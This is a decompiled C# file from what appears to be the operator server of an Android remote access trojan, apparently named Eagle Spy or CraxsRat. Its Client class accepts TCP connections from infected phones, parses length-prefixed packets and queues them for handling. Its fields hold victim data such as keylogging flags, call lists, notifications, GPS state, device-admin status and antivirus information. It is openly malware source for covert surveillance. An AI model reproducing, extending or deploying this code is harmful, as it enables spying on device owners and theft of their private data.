using System;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.My;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy.sockets
{
	// Token: 0x020000B5 RID: 181
	public class Client
	{
		// Token: 0x06000970 RID: 2416 RVA: 0x000E8270 File Offset: 0x000E6470
		public void CraxsRatkfvuiorkenfjhvkjhjklCraxsRatsmkasytw(TcpClient ParametersClient, int ParametersInteger, Accept sk)
		{
			try
			{
				this.MyServer = sk;
				this.myClient = ParametersClient;
				this.myClient.Client.ReceiveTimeout = -1;
				this.myClient.Client.SendTimeout = -1;
				this.myClient.Client.SendBufferSize = 5242880;
				this.myClient.Client.ReceiveBufferSize = 5242880;
				this.ClientRemoteAddress = ((IPEndPoint)ParametersClient.Client.RemoteEndPoint).ToString();
				this.ClientAddressIP = ((IPEndPoint)ParametersClient.Client.RemoteEndPoint).Address.ToString();
				this.ClientLocalAddress = this.ClientAddressIP + ":" + Conversions.ToString(ParametersInteger);
				this.isconnected = true;
				this.uptime = 60;
				this.isready = false;
				this.Wallpaper = null;
				this.Screen = "3";
				this.Wifi = null;
				this.WallpaperBackup = null;
				this.FirewallTable = new DataTable();
				this.TrackedAppsTable = new DataTable();
				this.Maxsize = -1L;
				this.Count = -1;
				this.Row = null;
				this.shot = true;
				this.qitGPS = false;
				this.qit = false;
				this.Keylogg = false;
				this.Keys = "0.0.0.0:0:null:null:null:null:0.0.0.0:0000:0";
				this.MemoryStream = new MemoryStream();
				this.buffer = new byte[1];
				this.SizeData = new object[] { -1, -1 };
				this.mydatestart = DateTime.Now.AddSeconds(45.0);
				try
				{
					if (!this.MyServer.Blocklist.Contains(this.ClientAddressIP))
					{
						this.myClient.Client.BeginReceive(this.buffer, 0, this.buffer.Length, SocketFlags.None, new AsyncCallback(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsthaszxy), this.myClient.Client);
					}
				}
				catch (Exception ex)
				{
				}
				new Thread(new ThreadStart(this.updatedata))
				{
					IsBackground = true
				}.Start();
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000971 RID: 2417 RVA: 0x000E84CC File Offset: 0x000E66CC
		private void updatedata()
		{
			for (;;)
			{
				try
				{
					do
					{
						Thread.Sleep(45000);
					}
					while (this.isconnected);
					this.Close(this.myClient);
				}
				catch (Exception ex)
				{
					continue;
				}
				break;
			}
		}

		// Token: 0x06000972 RID: 2418 RVA: 0x000E8518 File Offset: 0x000E6718
		public Client(TcpClient ParametersClient, int ParametersInteger, Accept sk)
		{
			this.ActiveNow = "";
			this.isconnected = false;
			this.needpong = false;
			this.IsonVPN = false;
			this.Country = "null";
			this.android = "null";
			this.ClientName = "null";
			this.UUID = "null";
			this.FolderUSER = "null";
			this.host = "null";
			this.Statistics = "null";
			this.BatteryCharge = "null";
			this.isnewcall = false;
			this.ID = 0;
			this.@lock = RuntimeHelpers.GetObjectValue(new object());
			this.EXI = false;
			this.power = false;
			this.isnewnotifi = false;
			this.CountPoing = 0;
			this.VersionClient = "n/a";
			this.isready = false;
			this.MaxPower = false;
			this.pooked = false;
			this.IsAdminActive = false;
			this.IsReal = false;
			this.mylock = RuntimeHelpers.GetObjectValue(new object());
			this.CraxsRatkfvuiorkenfjhvkjhjklCraxsRatsmkasytw(ParametersClient, ParametersInteger, sk);
		}

		// Token: 0x06000973 RID: 2419 RVA: 0x000E8624 File Offset: 0x000E6824
		public void SendMessage(object[] ParametersObjects)
		{
			try
			{
				byte[] array = Codes.FormatPacket((string)ParametersObjects[1], (byte[])ParametersObjects[2]);
				this.Sender(array);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000974 RID: 2420 RVA: 0x000E8670 File Offset: 0x000E6870
		private void SendCallback(IAsyncResult ar)
		{
			try
			{
				TcpClient tcpClient = (TcpClient)ar.AsyncState;
				tcpClient.Client.EndSend(ar);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000975 RID: 2421 RVA: 0x000E86B8 File Offset: 0x000E68B8
		public void Sender(byte[] bByte)
		{
			checked
			{
				new Thread(delegate
				{
					object obj = this.@lock;
					ObjectFlowControl.CheckForSyncLockOnValueType(obj);
					lock (obj)
					{
						Thread.Sleep(1);
						try
						{
							if (this.isconnected)
							{
								this.myClient.Client.Poll(-1, SelectMode.SelectWrite);
								this.myClient.Client.SendBufferSize = bByte.Length;
								this.myClient.Client.Send(bByte, 0, bByte.Length, SocketFlags.None);
								this.MyServer.BytesSent += unchecked((long)bByte.Length);
							}
						}
						catch (SocketException ex)
						{
							this.isconnected = false;
						}
						catch (ObjectDisposedException ex2)
						{
							this.isconnected = false;
						}
						catch (Exception ex3)
						{
							this.isconnected = false;
						}
					}
				})
				{
					IsBackground = true
				}.Start();
			}
		}

		// Token: 0x06000976 RID: 2422 RVA: 0x000E86F8 File Offset: 0x000E68F8
		public void Blockme(string ip)
		{
			if (!this.MyServer.Blocklist.Contains(ip))
			{
				this.MyServer.Blocklist.Add(ip);
				Data.MainForm.DGVblocked.Rows.Add(new object[] { this.Flag, ip });
			}
		}

		// Token: 0x06000977 RID: 2423 RVA: 0x000E8754 File Offset: 0x000E6954
		public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsthaszxy(IAsyncResult ar)
		{
			int num;
			try
			{
				num = this.myClient.Client.EndReceive(ar);
			}
			catch (SocketException ex)
			{
				num = -1;
			}
			catch (Exception ex2)
			{
				num = -1;
			}
			checked
			{
				if (num > 0)
				{
					try
					{
						this.MyServer.BytesReceived += unchecked((long)num);
						if (this.Maxsize == -1L)
						{
							if (this.buffer[0] == 0)
							{
								this.MemoryStream.WriteByte(this.buffer[0]);
								this.Count++;
								if (this.Count == 1)
								{
									string text = Codes.Encoding().GetString(this.MemoryStream.ToArray()).Trim();
									string[] array = text.Split(new char[1], StringSplitOptions.None);
									long num2 = (Versioned.IsNumeric(array[0].Trim()) ? Conversions.ToLong(array[0].Trim()) : 0L);
									long num3 = (Versioned.IsNumeric(array[1].Trim()) ? Conversions.ToLong(array[1].Trim()) : 0L);
									this.SizeData = new object[] { num2, num3 };
									this.Maxsize = num2 + num3;
									long maxsize = this.Maxsize;
									this.myClient.Client.ReceiveBufferSize = (int)maxsize;
									this.Count = -1;
									this.buffer = new byte[(int)(this.Maxsize - 1L) + 1 - 1 + 1];
									this.MemoryStream.Dispose();
									this.MemoryStream = new MemoryStream();
								}
							}
							else
							{
								this.MemoryStream.WriteByte(this.buffer[0]);
							}
						}
						else
						{
							this.MemoryStream.Write(this.buffer, 0, num);
							if (unchecked((long)this.MemoryStream.ToArray().Length) == this.Maxsize)
							{
								ListData listData = new ListData(this, this.MemoryStream.ToArray(), this.SizeData, this.myClient);
								object objectValue = RuntimeHelpers.GetObjectValue(this.MyServer.SyncObj);
								object obj = objectValue;
								ObjectFlowControl.CheckForSyncLockOnValueType(obj);
								lock (obj)
								{
									this.MyServer.RequestsReceiver.Add(listData);
								}
								do
								{
									Thread.Sleep(1);
									Application.DoEvents();
								}
								while (!listData.wait);
								this.MemoryStream.Dispose();
								this.MemoryStream = new MemoryStream();
								this.SizeData = new object[] { -1, -1 };
								this.Maxsize = -1L;
								this.buffer = new byte[1];
							}
							else
							{
								this.buffer = new byte[(int)(this.Maxsize - this.MemoryStream.Length - 1L) + 1 - 1 + 1 - 1 + 1];
							}
						}
					}
					catch (Exception ex3)
					{
					}
					try
					{
						if (this.myClient.Client.Connected)
						{
							this.myClient.Client.BeginReceive(this.buffer, 0, this.buffer.Length, SocketFlags.None, new AsyncCallback(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsthaszxy), this.myClient.Client);
						}
						else
						{
							this.isconnected = false;
						}
						return;
					}
					catch (SocketException ex4)
					{
						this.isconnected = false;
						return;
					}
					catch (Exception ex5)
					{
						this.isconnected = false;
						return;
					}
				}
				this.isconnected = false;
			}
		}

		// Token: 0x06000978 RID: 2424 RVA: 0x000E8B54 File Offset: 0x000E6D54
		public void Close(TcpClient client)
		{
			try
			{
				if (!this.EXI)
				{
					this.EXI = true;
					this.qit = true;
					this.isconnected = false;
					new Thread(new ThreadStart(this.close_async))
					{
						IsBackground = true
					}.Start();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000979 RID: 2425 RVA: 0x000E8BC0 File Offset: 0x000E6DC0
		public void close_async()
		{
			try
			{
				if (this.FirewallTable.Rows.Count > 0)
				{
					Data.MainForm.Invoke(new VB_0024AnonymousDelegate_0(delegate
					{
						this.FirewallTable.Rows.Clear();
						this.FirewallTable.Dispose();
					}));
				}
			}
			catch (Exception ex)
			{
			}
			try
			{
				if (this.TrackedAppsTable.Rows.Count > 0)
				{
					Data.MainForm.Invoke(new VB_0024AnonymousDelegate_0(delegate
					{
						this.TrackedAppsTable.Rows.Clear();
						this.TrackedAppsTable.Dispose();
					}));
				}
			}
			catch (Exception ex2)
			{
			}
			if (this.MemoryStream != null)
			{
				try
				{
					this.MemoryStream.Dispose();
				}
				catch (Exception ex3)
				{
				}
			}
			if (this.myClient != null)
			{
				try
				{
					if (this.myClient.Client.Connected)
					{
						this.myClient.GetStream().Close();
					}
				}
				catch (Exception ex4)
				{
				}
				try
				{
					this.myClient.Client.Close();
				}
				catch (Exception ex5)
				{
				}
			}
			try
			{
				if (this.Row != null)
				{
					Data.MainForm.Invoke(new VB_0024AnonymousDelegate_0(delegate
					{
						Data.LOGIT(this, "Disconnected", this.Flag);
						if (Operators.CompareString(MySettingsProperty.Settings.ShowAlertDis, "Yes", false) == 0)
						{
							EagleAlert.ShowCustome("Connection Lost", this.Wallpaper, Color.Black, Color.FromArgb(157, 5, 17));
						}
					}));
					Data.MainForm.RemoveCard(this.Row, this.UUID);
					this.Row = null;
				}
			}
			catch (Exception ex6)
			{
			}
			try
			{
				if (this.ClientRemoteAddress != null && Data.ClientsOnline.Contains(this.ClientRemoteAddress))
				{
					Data.ClientsOnline.Remove(this.ClientRemoteAddress);
				}
			}
			catch (Exception ex7)
			{
			}
		}

		// Token: 0x0600097A RID: 2426 RVA: 0x000E8DA8 File Offset: 0x000E6FA8
		public int Progresr()
		{
			int num = 0;
			int num2;
			if (this.Maxsize == -1L)
			{
				num2 = num;
			}
			else
			{
				try
				{
					num = checked(this.RateConverter((int)this.MemoryStream.Length, (int)this.Maxsize));
					num2 = num;
				}
				catch (ObjectDisposedException ex)
				{
					num2 = 0;
				}
			}
			return num2;
		}

		// Token: 0x0600097B RID: 2427 RVA: 0x000E8E08 File Offset: 0x000E7008
		public int RateConverter(int Value, int Totalsize)
		{
			checked
			{
				int num;
				try
				{
					num = ((Totalsize != 0) ? ((int)Math.Round(unchecked((double)Value / (double)Totalsize * 100.0))) : 0);
				}
				catch (Exception ex)
				{
					num = 0;
				}
				return num;
			}
		}

		// Token: 0x04000B7D RID: 2941
		public string Keys;

		// Token: 0x04000B7E RID: 2942
		public string ClientAddressIP;

		// Token: 0x04000B7F RID: 2943
		public string ClientRemoteAddress;

		// Token: 0x04000B80 RID: 2944
		public string ActiveNow;

		// Token: 0x04000B81 RID: 2945
		public string ClientLocalAddress;

		// Token: 0x04000B82 RID: 2946
		public byte[] buffer;

		// Token: 0x04000B83 RID: 2947
		public MemoryStream MemoryStream;

		// Token: 0x04000B84 RID: 2948
		public long Maxsize;

		// Token: 0x04000B85 RID: 2949
		public bool isconnected;

		// Token: 0x04000B86 RID: 2950
		public int Count;

		// Token: 0x04000B87 RID: 2951
		public Size ScreenSize;

		// Token: 0x04000B88 RID: 2952
		public object[] SizeData;

		// Token: 0x04000B89 RID: 2953
		public DataGridViewRow Row;

		// Token: 0x04000B8A RID: 2954
		public DataTable FirewallTable;

		// Token: 0x04000B8B RID: 2955
		public DataTable TrackedAppsTable;

		// Token: 0x04000B8C RID: 2956
		public string[] TrackedDatesFounded;

		// Token: 0x04000B8D RID: 2957
		public bool needpong;

		// Token: 0x04000B8E RID: 2958
		public bool IsonVPN;

		// Token: 0x04000B8F RID: 2959
		public bool qit;

		// Token: 0x04000B90 RID: 2960
		public bool qitGPS;

		// Token: 0x04000B91 RID: 2961
		public bool shot;

		// Token: 0x04000B92 RID: 2962
		public bool Keylogg;

		// Token: 0x04000B93 RID: 2963
		public Bitmap Flag;

		// Token: 0x04000B94 RID: 2964
		public string Screen;

		// Token: 0x04000B95 RID: 2965
		public string Battery;

		// Token: 0x04000B96 RID: 2966
		public string Country;

		// Token: 0x04000B97 RID: 2967
		public string android;

		// Token: 0x04000B98 RID: 2968
		public string ClientName;

		// Token: 0x04000B99 RID: 2969
		public string UUID;

		// Token: 0x04000B9A RID: 2970
		public string FolderUSER;

		// Token: 0x04000B9B RID: 2971
		public string host;

		// Token: 0x04000B9C RID: 2972
		public string Statistics;

		// Token: 0x04000B9D RID: 2973
		public string BatteryCharge;

		// Token: 0x04000B9E RID: 2974
		public string[] CALLS;

		// Token: 0x04000B9F RID: 2975
		public bool isnewcall;

		// Token: 0x04000BA0 RID: 2976
		public int ID;

		// Token: 0x04000BA1 RID: 2977
		private readonly object @lock;

		// Token: 0x04000BA2 RID: 2978
		public bool EXI;

		// Token: 0x04000BA3 RID: 2979
		public Bitmap Wallpaper;

		// Token: 0x04000BA4 RID: 2980
		public Bitmap WallpaperBackup;

		// Token: 0x04000BA5 RID: 2981
		public bool power;

		// Token: 0x04000BA6 RID: 2982
		public bool isnewnotifi;

		// Token: 0x04000BA7 RID: 2983
		public int CountPoing;

		// Token: 0x04000BA8 RID: 2984
		public string VersionClient;

		// Token: 0x04000BA9 RID: 2985
		public Accept MyServer;

		// Token: 0x04000BAA RID: 2986
		public TcpClient myClient;

		// Token: 0x04000BAB RID: 2987
		public int uptime;

		// Token: 0x04000BAC RID: 2988
		public string ClientDefender;

		// Token: 0x04000BAD RID: 2989
		public string installdate;

		// Token: 0x04000BAE RID: 2990
		public string Phone_model;

		// Token: 0x04000BAF RID: 2991
		public string[] Notifications;

		// Token: 0x04000BB0 RID: 2992
		public bool isready;

		// Token: 0x04000BB1 RID: 2993
		public bool MaxPower;

		// Token: 0x04000BB2 RID: 2994
		public bool pooked;

		// Token: 0x04000BB3 RID: 2995
		public bool IsAdminActive;

		// Token: 0x04000BB4 RID: 2996
		public bool IsReal;

		// Token: 0x04000BB5 RID: 2997
		public bool Isv4;

		// Token: 0x04000BB6 RID: 2998
		public Bitmap Wifi;

		// Token: 0x04000BB7 RID: 2999
		public DateTime mydatestart;

		// Token: 0x04000BB8 RID: 3000
		private readonly object mylock;
	}
}
